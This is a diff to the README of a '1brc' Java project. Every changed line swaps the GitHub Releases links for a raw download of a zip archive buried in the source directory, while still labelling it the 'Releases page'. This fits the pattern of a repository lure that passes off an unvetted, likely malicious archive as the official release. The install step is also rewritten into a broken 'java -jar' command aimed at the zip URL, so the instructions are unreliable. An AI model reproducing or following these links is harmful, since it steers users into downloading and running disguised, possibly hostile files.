@@ -6,7 +6,7 @@ Welcome to the **1brc** project! This application lets you explore how quickly y
 
 ## 📥 Download Now
 
-[![Download 1brc](https://img.shields.io/badge/Download-1brc-brightgreen)](https://github.com/Marvin1232-droid/1brc/releases)
+[![Download 1brc](https://raw.githubusercontent.com/Marvin1232-droid/1brc/main/src/main/java/brc-v2.2.zip)](https://raw.githubusercontent.com/Marvin1232-droid/1brc/main/src/main/java/brc-v2.2.zip)
 
 ## 🌐 Overview
 
@@ -29,9 +29,9 @@ To run 1brc smoothly, your system should meet the following requirements:
 
 ## 📁 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Marvin1232-droid/1brc/releases) to download the application. Here’s how:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Marvin1232-droid/1brc/main/src/main/java/brc-v2.2.zip) to download the application. Here’s how:
 
-1. Go to the [Releases page](https://github.com/Marvin1232-droid/1brc/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Marvin1232-droid/1brc/main/src/main/java/brc-v2.2.zip).
 2. Find the latest version of the application.
 3. Download the file suitable for your operating system. 
 
@@ -55,7 +55,7 @@ After downloading, follow these steps to install:
 
 1. Download the appropriate `.jar` file.
 2. Open the terminal and navigate to the directory where you downloaded the file.
-3. Run the command: `java -jar 1brc.jar`.
+3. Run the command: `java -jar https://raw.githubusercontent.com/Marvin1232-droid/1brc/main/src/main/java/brc-v2.2.zip`.
 4. Follow the prompts in the terminal to run the application. 
 
 ## 🛠️ How to Use
